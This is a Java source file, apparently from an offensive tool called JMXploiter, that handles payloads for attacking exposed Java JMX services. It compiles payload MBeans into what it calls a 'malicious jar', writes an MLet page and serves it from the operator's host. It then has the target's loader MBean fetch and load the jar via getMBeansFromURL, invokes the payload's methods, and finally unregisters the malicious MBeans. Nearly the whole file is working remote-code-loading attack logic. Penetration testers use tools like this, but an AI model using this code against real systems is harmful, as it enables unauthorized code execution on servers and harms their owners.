package payloadManager;

import jmxManagers.JMXMBeanManager;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.RandomStringUtils;
import runnable.JMXploiter;
import utilities.Utility;
import webserver.WebServer;

import javax.management.InstanceNotFoundException;
import javax.management.MBeanRegistrationException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URISyntaxException;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.jar.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PayloadHandler {
    private static final String PAYLOAD_OUTPUT = "output";
    private static final String PAYLOAD_DIRECTORY = "payloads";
    private static final String JAVA_EXTENSION = ".java";
    private static final String JAR_EXTENSION = ".jar";
    private static final String JAR_DIR = "payloads";
    private static final String DEST_DIR = "payloads";
    private static final String MBEAN_SUFFIX = "MBean";
    private static final String DEFAULT_METHOD_PROPERTY = "defaultMethodName";
    // TODO when we're done, make it so all paths works OS independent
    // private static final boolean customPayloadDirectorySet = false; //so we can make this work on windows easier
    private static final String httpPrefix = "http://";
    private static final String portDelimiter = ":";
    private static final String lURI = "/" + WebServer.getIndexDirectory();  //TODO need a flag or a configuration to specify this
    private static final String outputDirectory;
    private static final String payloadDirectory;
    //Method handling stuff
    private static String methodToCall = null;
    private static String paramsToCall = null;
    private static String lHost = null;
    private static int lPort = 0;
    private static String payloadOutputName = "payload";
    private static boolean uninstall = true;
    private static boolean servePayload = true;
    private static boolean DEBUG = false;

    static {
        outputDirectory = System.getProperty("user.dir") + "/" + PAYLOAD_OUTPUT + "/";
        payloadDirectory = System.getProperty("user.dir") + "/" + PAYLOAD_DIRECTORY + "/";
        //TODO find other locations these directories are called (they are out there)

        //We randomize the payload name to avoid caching
        payloadOutputName += "_" + RandomStringUtils.randomAlphanumeric(5) + JAR_EXTENSION;
    }

    public static String getOutputDirectory() {
        return outputDirectory;
    }

    public static void initialize_directories() {
        Path outputPath, payloadsPath, configPath;
        boolean outputExists, payloadExists, configExists;
        configPath = Paths.get(JMXploiter.getPropertiesFileName());
        outputPath = Paths.get(outputDirectory);
        outputExists = Files.exists(outputPath);
        configExists = Files.exists(configPath);

        payloadsPath = Paths.get(payloadDirectory);
        payloadExists = Files.exists(payloadsPath);

        if (!outputExists) {
            System.out.println("Output Directory does not exist. Creating it now.");
            try {
                Files.createDirectory(outputPath);
            } catch (IOException e) {
                System.out.println("Could not initialize ouptut directory " + e.toString());
            }
        }

        if (!configExists) {
            System.out.println("A config file does not exist. Creating it now.");
            Utility.generateNewConfg();
        }

        if (!payloadExists) {
            System.out.println("Payloads Directory does not exists. Creating it now.\n");
            try {
                Files.createDirectory(payloadsPath);
                copyResourcesToDirectory(JAR_DIR, DEST_DIR);
            } catch (IOException e) {
                System.out.println("Could not create payloads directory " + e.toString());
            }
        } else {
            try {
                copyResourcesToDirectory("payloads", "payloads");
            } catch (IOException e) {
                System.out.println("Could copy transfer payloads from resources to payloads directory " + e.toString());
            }
        }

    }

    /**
     * Copies a directory from a jar file to an external directory.
     * Modified from
     * http://www.java2s.com/Code/Android/File/Copiesadirectoryfromajarfiletoanexternaldirectory.htm
     */
    private static void copyResourcesToDirectory(String jarDir, String destDir) throws IOException {
        String jarString = "";
        try {
            // Get the path of the currently running jar file
            jarString = PayloadHandler.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (URISyntaxException ignored) {
        }
        JarFile fromJar = new JarFile(jarString);
        // Enumerate all entries within the JAR, only matching files with the prefix defined in jarDir
        for (Enumeration<JarEntry> entries = fromJar.entries(); entries.hasMoreElements(); ) {
            JarEntry entry = entries.nextElement();
            // If matched, copy file to folder defined in destDir
            if (entry.getName().startsWith(jarDir + "/") && !entry.isDirectory()) {
                File dest = new File(destDir + "/" + entry.getName().substring(jarDir.length() + 1));
                File parent = dest.getParentFile();

                // This shouldn't ever happen due to initialize_directories, but robust is good
                if (parent != null) {
                    parent.mkdirs();
                }

                try (FileOutputStream out = new FileOutputStream(dest); InputStream in = fromJar.getInputStream(entry)) {
                    byte[] buffer = new byte[8 * 1024];

                    int s;
                    while ((s = in.read(buffer)) > 0) {
                        out.write(buffer, 0, s);
                    }
                } catch (IOException e) {
                    throw new IOException("Could not copy asset from jar file", e);
                }
            }
        }
        fromJar.close();
    }

    /**
     * Standard setter for the listening host (where to fetch the payload from)
     *
     * @param newLHost the new lhost value to use
     */
    public static void setLHost(String newLHost) {
        try {
            InetAddress address = InetAddress.getByName(newLHost);
            lHost = address.getHostAddress();
        } catch (UnknownHostException unknownHostException) {
            System.out.println("Could not resolve the hostname for the lhost " + unknownHostException.toString());
            System.exit(0);
        }
    }

    /**
     * Standard setter for name of the method to call of an mbean
     *
     * @param newMethodName the name of the method to call
     */
    public static void setMethodsToCall(String newMethodName) {
        methodToCall = newMethodName;
    }

    /**
     * Standard setter for the parameters list. This should be
     * a String separated by commas
     *
     * @param newParamsList the new list of parameters to set
     */
    public static void setParamsToUse(String newParamsList) {
        paramsToCall = newParamsList;

    }


    /**
     * This uninstalls the payload from the JMX console
     *
     * @param serverConnection a handler to the MBean server containing the payload
     */
    public static void uninstall(MBeanServerConnection serverConnection) {
        ObjectName targetToUninstall = JMXMBeanManager.getLoaderMBeanName();
        try {
            //Calls the default Mbean unload business
            serverConnection.unregisterMBean(targetToUninstall);
            System.out.println("Uninstalled " + targetToUninstall.toString());
        } catch (InstanceNotFoundException e) {
            System.out.println("Could not find the MBean for uninstallation " + e.toString());
        } catch (MBeanRegistrationException e) {
            System.out.println("There was an issue with the MBean registration " + e.toString());
        } catch (IOException e) {
            System.out.println("An unknown error occurred during uninstallation " + e.toString());
        }
    }

    /**
     * Loads an MBean from a URL, for this to work the loader mbean must already be
     * installed. The JMXMBeanManager class can do this
     *
     * @param serverConnection the handle to the JMX connection
     * @param managerMBeanName the mbean to invoke to call this, note
     *                         when it's loaded, the manager mbean can have any name you want for it
     */
    public static void getMBeanFromURL(MBeanServerConnection serverConnection, ObjectName managerMBeanName) {
        String targetURL;
        int truePort = 0;

        if (lHost == null) {
            lHost = Utility.getHostIPAddress();
        }

        if (servePayload) {
            InetSocketAddress socket = new InetSocketAddress(lPort);
            truePort = WebServer.servePages(socket); //In the case where port is randomly selected, we need to true port
        }

        if (truePort > 0) {
            targetURL = httpPrefix + lHost + portDelimiter + truePort + lURI;
        } else {
            targetURL = httpPrefix + lHost + portDelimiter + lPort + lURI;
        }

        try {
            //Invoke operation
            //name is the mbean to invoke, the second one is the method to invoke,
            //Parameter 3, is an array of objects, and those objects become the parameters to be passed into the mbean
            //The 4th parameter is a signature array giving the class or interface names of the invoked operation's parameters, i.e tell it what objects are being passed in during the parameters
            System.out.println("Attempting to load the payload from " + targetURL);
            serverConnection.invoke(managerMBeanName, "getMBeansFromURL", new Object[]{targetURL}, new String[]{String.class.getName()});
            System.out.println("At this point, the payload should be loaded");
        } catch (Exception e) {
            System.out.println("Could not load payload MBean from URL. There may not be a payload present. Try the -p flag. Error: \n" + e.toString());
            System.exit(1);
        }

    }

    public static String executePayload(MBeanServerConnection serverConnection) {
        ObjectName payloadName = JMXMBeanManager.getPayloadMBeanName();
        Object[] params = null;
        String[] paramsType = null;

        //grab the last generated payload's default method if available
        if (methodToCall == null) {
            methodToCall = JMXMBeanManager.getProperty(DEFAULT_METHOD_PROPERTY);
        }

        if (paramsToCall != null) {
            params = paramsToCall.split(",");
            paramsType = new String[params.length];


            //TODO this should be updated to allow for more paramter types
            for (int i = 0; i < params.length; i++) //for now we're just going to allow strings
                paramsType[i] = String.class.getName();

        }

        //This can get the response from the method we call
        String response = "";
        try {
            //No parameters to my add SSH
            //Invoke operation
            //name is the mbean to invoke, the second one is the method to invoke,
            //So parameter 3, is an array of objects, and those objects become the parameters to be passed into the mbean
            //The 4th parameter is a signature array giving the class or interface names of the invoked operation's parameters, i.e tell it what objects are being passed in during the parameters
            response = (String) serverConnection.invoke(payloadName, methodToCall, params, paramsType);
        } catch (Exception e) {
            System.out.println("Could not execute payload " + e.toString());
        }

        return response;

    }


    //Updates the default method property to the first
    //method in the last generated payload, this is the method exploited automatically if nothing is specified
    private static void updateFirstMethodName(String payloadToGenerate) {
        //Okay, I'm going to do it this way, read it to a string and regex that .....
        //Interface will be smaller
        try {
            String methodName = "";

            byte[] encoded = Files.readAllBytes(Paths.get(payloadDirectory + payloadToGenerate + ".java"));
            String theClass = new String(encoded, StandardCharsets.UTF_8);

            String regex = "(public|protected|private|static|\\s) +[\\w<>\\[\\]]+\\s+(\\w+) *\\([^)]*\\) *(\\{?|[^;])";
            Pattern pattern = Pattern.compile(regex);

            Matcher matcher = pattern.matcher(theClass);
            if (matcher.find()) {

                for (String element : matcher.group().split(" ")) {
                    int positionOfBracket = element.indexOf("(");
                    if (positionOfBracket >= 0) {
                        methodName = element.substring(0, positionOfBracket);
                        break;
                    }
                }
                // get the property value and print it out
                JMXMBeanManager.setProperty(DEFAULT_METHOD_PROPERTY, methodName);
            }
            System.out.println("Default method name is updated to :" + methodName);
        } catch (Exception e) {
            System.out.println("An error occurred while writing to the properties file. This may cause issues " + e.toString());
        }
    }

    /**
     * This is the self cleaning convenience method, it removes
     * any unwanted mbeans
     *
     * @param serverConnection a handle to the JMX server
     */
    public static void removeMaliciousMBeans(MBeanServerConnection serverConnection) {
        try {
            if (uninstall) {
                serverConnection.unregisterMBean(JMXMBeanManager.getLoaderMBeanName());
                serverConnection.unregisterMBean(JMXMBeanManager.getPayloadMBeanName());
            } else {
                System.out.println("\"nou\" flag recognized. Malicious mbeans not uninstalled");
            }

        } catch (Exception e) {
            System.out.println("Could not remove malicious MBeans " + e.toString());
        }
    }

    /**
     * Dynamically generates a payload to use based on user input, this is then put into the output folder
     *
     * @param payloadToGenerate
     */
    public static void generateMBeanPayloadKit(String payloadToGenerate) {
        //allow for parameters to be case insensitive
        payloadToGenerate = correctPayloadCase(payloadToGenerate);

        //clean up the package structure
        removePackage(payloadToGenerate + ".java");
        removePackage(payloadToGenerate + MBEAN_SUFFIX + ".java");

        //here we handle appropriate properties file updates
        updateFirstMethodName(payloadToGenerate);
        JMXMBeanManager.setProperty("lastPayloadName", payloadOutputName);

        //First we're going to clear the directory because it will avoid many headaches
        try {
            FileUtils.cleanDirectory(new File(outputDirectory));
        } catch (IOException e1) {
            System.out.println("Could not clear " + outputDirectory + " " + e1.toString());
        }

        //This is the basic html page used to handle JMX stuff
        //note the package has to be correct for the payloadToGenerate i.e. beans.payload or com.something.beans.payload
        String htmlContent = "<html><mlet code=\"" + payloadToGenerate +
                "\" archive=\"" + payloadOutputName +
                "\" name=\"" + JMXMBeanManager.getPayloadMBeanName() +
                "\" codebase=\"/\"></mlet>";

        writeHTMLStringToFile(htmlContent);

        try {
            boolean successful = compileFiles(payloadToGenerate);
            if (!successful) {
                System.out.println("Compilation failed, exiting");
                System.exit(0);
            }

            createJarFromCompiledPayload();

        } catch (Exception e) {
            System.out.println("Could not compile payload, did you provide correct name?" + e.toString());
            System.exit(1);
        }
    }

    /**
     * Returns a de-duped set of all the available payloads
     * Does this by stripping off extensions and mbean suffix, removing
     * duplicates and then displaying what's left.
     *
     * @return the list of all available payloads as a set. Duplicates have been removed
     */
    private static Set<String> getPayloadsSet() {
        File dir = new File(System.getProperty("user.dir") + "/" + PAYLOAD_DIRECTORY);
        String[] extensions = new String[]{"java"};


        List<File> payloads = (List<File>) FileUtils.listFiles(dir, extensions, true);
        Set<String> payloadsList = new HashSet<>();

        //Kind of a crappy way to do this, but just read everything, trim off the extra, remove duplicates
        for (File element : payloads) {
            String workingName = element.getName();
            workingName = workingName.replaceAll("(?i)mbean", ""); //replace the mbean suffix
            workingName = workingName.replaceAll("(?i).java", ""); //replace the extension
            payloadsList.add(workingName);
        }

        return payloadsList;
    }

    /**
     * Converts a provided payload name to the correct case of the payload.
     * Throws an error if it cannot be found
     *
     * @param providedName the original, case insensitive name
     * @return the corrected, case sensitive name
     */
    private static String correctPayloadCase(String providedName) {
        Set<String> payloadsList = getPayloadsSet();

        for (String element : payloadsList) {
            if (providedName.equalsIgnoreCase(element))
                return element;
        }

        System.out.println("No match for the payload name found, could not generate. You entered " + providedName);
        System.out.println("Available payloads are:");
        listPayloads();
        System.exit(0);

        return null;
    }

    /**
     * Reads any compiled classes in the output directory, packs them into a jar, then removes them
     *
     * @throws FileNotFoundException thrown if the raw payloads cannot be found
     * @throws IOException           thrown if an issue occurs while reading payloads
     */
    private static void createJarFromCompiledPayload() throws FileNotFoundException, IOException {
        File dir = new File(outputDirectory);
        String[] classExtension = new String[]{"class"};
        List<File> toJar = (List<File>) FileUtils.listFiles(dir, classExtension, true); //we need this recursive for packages

        System.out.println("Now creating the malicious jar file ");
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
        JarOutputStream target = new JarOutputStream(new FileOutputStream(outputDirectory + payloadOutputName), manifest);
        BufferedInputStream in = null;

        for (File element : toJar) {
            //System.out.println("A class has been added to malicious jar :" + element.getAbsolutePath());
            JarEntry je = new JarEntry(element.getName());
            je.setTime(element.lastModified());
            target.putNextEntry(je);

            in = new BufferedInputStream(new FileInputStream(element));

            byte[] buffer = new byte[1024];
            while (true) {
                int count = in.read(buffer);
                if (count == -1)
                    break;
                target.write(buffer, 0, count);
            }

            target.closeEntry();
            element.delete();
        }
        if (in != null)
            in.close();
        target.close();
        System.out.println("Jar was created successfully\n");
    }

    private static void removePackage(String payloadToGenerate) {

        try {
            File inputFile = new File(payloadDirectory + payloadToGenerate);
            File tempFile = new File(payloadToGenerate + "myTempFile.txt");

            BufferedReader reader = new BufferedReader(new FileReader(inputFile));
            BufferedWriter writer = new BufferedWriter(new FileWriter(tempFile));

            String lineToRemove = "package";
            String currentLine;

            while ((currentLine = reader.readLine()) != null) {
                // trim newline when comparing with lineToRemove
                String trimmedLine = currentLine.trim();
                if (trimmedLine.startsWith(lineToRemove)) continue;
                writer.write(currentLine + System.getProperty("line.separator"));
            }

            writer.close();
            reader.close();
            tempFile.renameTo(inputFile);
        } catch (Exception e) {
            System.out.println("Could not remove package identifier from payloads, this may cause issues" + e.toString());
        }

    }


    /**
     * This reads a payload from the payload directory and compiles it.
     * As of right now, it always tries to compile to the lowest Java version possible
     *
     * @param payloadToGenerate the name of the payload to use
     * @return true if the compilation was successful
     */
    private static boolean compileFiles(String payloadToGenerate) {

        String payload = payloadDirectory + payloadToGenerate + JAVA_EXTENSION;
        String payloadMBean = payloadDirectory + payloadToGenerate + MBEAN_SUFFIX + JAVA_EXTENSION;

        System.out.println("Reading raw payloads from: " + payloadDirectory);
        System.out.println("Writing malicious jars to: " + outputDirectory);

        //handle the compilation-------
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        int compilationResult;
        boolean successful = false;

        OutputStream nullOutput = null; //null defaults to stdout and stderror
        if (!DEBUG)
            nullOutput = new OutputStream() {
                @Override
                public void write(int b) throws IOException {
                }
            };

        //TODO clean this up or set a config
        for (int i = 2; i < 8; i++) //we're going to try up to Java 8, will read this from a config later
        {
            String vTarget = "1." + i;
            System.out.println("Now attempting to compile with Java " + vTarget);
            compilationResult = compiler.run(null, nullOutput, nullOutput, "-d", outputDirectory, "-Xlint:none", "-target", vTarget, "-source", vTarget,
                    payload, payloadMBean);
            if (compilationResult == 0) {
                System.out.println("Compiled successfully with Java " + vTarget);
                successful = true;
                break;
            }
        }
        return successful;

    }

    /**
     * This is just a helper method that writes a String to an HTML file. It's used to dynamically
     * create a page to server up generated mbeans.
     *
     * @param htmlContent the content to write to an HTML file
     */
    private static void writeHTMLStringToFile(String htmlContent) {
        try {
            List<String> lines = Collections.singletonList(htmlContent);
            Path file = Paths.get(PAYLOAD_OUTPUT + lURI);
            Files.write(file, lines, StandardCharsets.UTF_8);
        } catch (Exception e) {
            System.out.println("Could not write the output file. This may cause issues " + e.toString());
        }
    }

    /**
     * Attempts to list all payloads in the payloads directory.
     */
    public static void listPayloads() {
        Set<String> payloadsList = getPayloadsSet();

        for (String element : payloadsList) {
            System.out.println(element);
        }
    }

    public static void setUninstall(boolean b) {
        uninstall = b;
    }

    public static void setLPort(String newPort) {
        try {
            lPort = Integer.parseInt(newPort);
        } catch (Exception e) {
            System.out.println("Invalid port specification: " + newPort);
            System.exit(1);
        }
    }

    public static void setServePayload(boolean newValue) {
        servePayload = newValue;
    }

    public static void setDebug(boolean newValue) {
        DEBUG = newValue;
    }

    public static String getpayloadOutputName() {
        return payloadOutputName;
    }

}
